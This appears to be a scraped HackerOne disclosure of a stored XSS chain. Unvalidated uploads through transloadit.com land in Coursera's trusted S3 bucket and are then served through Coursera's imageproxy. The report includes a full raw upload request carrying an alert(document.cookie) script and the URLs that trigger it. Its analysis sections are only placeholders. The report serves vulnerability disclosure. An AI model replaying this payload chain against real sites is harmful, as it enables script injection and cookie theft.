# Stored XSS via transloadit.com and imageproxy

## Metadata
- **Source:** HackerOne
- **Report:** 216822 | https://hackerone.com/reports/216822
- **Submitted:** 2017-03-28
- **Reporter:** c0rdis
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** high
- **Vuln:** Cross-site Scripting (XSS) - Stored
- **CVEs:** None
- **Category:** web-api

## Summary
Hello,
due to poor input file validation on transloadit.com, it is possible to upload and process any filetype on their server, which would later be uploaded to coursera-profile-photos.s3.amazonaws.com. From there, since imageproxy trusts coursera-profile-photos.s3.amazonaws.com, one can fetch arbitrary content and, in case of javascript, get it executed in the browser. 

Steps to reproduce:

1) L

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello,
due to poor input file validation on transloadit.com, it is possible to upload and process any filetype on their server, which would later be uploaded to coursera-profile-photos.s3.amazonaws.com. From there, since imageproxy trusts coursera-profile-photos.s3.amazonaws.com, one can fetch arbitrary content and, in case of javascript, get it executed in the browser. 

Steps to reproduce:

1) Let's send html file with trivial XSS vector to transloadit.com. Please note that no authentication is required.
POST /assemblies/[hash]?redirect=false HTTP/1.1
Host: isadora.transloadit.com
Referer: https://api.coursera.org/account/profile
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------185739484714145007371896001880
Content-Length: 521

-----------------------------185739484714145007371896001845
Content-Disposition: form-data; name="params"

{"max_size":1048576,"auth":{"key":"[hash2]"},"template_id":"[hash3]"}
-----------------------------185739484714145007371896001845
Content-Disposition: form-data; name="my_file"; filename="stored_xss.html"
Content-Type: text/html

<html>
<script>
alert(document.cookie);
</script>
</html>
-----------------------------185739484714145007371896001845--

2) By accessing https://isadora.transloadit.com/assemblies/[hash]?seq=0&callback=, we can learn the URL of the uploaded malicious file (in this case it's http://coursera-profile-photos.s3.amazonaws.com██████████stored_xss.html)

3) Since it's already trusted, we could use it to upload as the profile photo, or to fetch via imageproxy as mentioned above. Final URL: https://www.coursera.org/api/utilities/v1/imageproxy/http://coursera-profile-photos.s3.amazonaws.com█████stored_xss.html

Please find the screenshot attached.
AA

</details>

---
*Analysed by Claude on 2026-05-24*
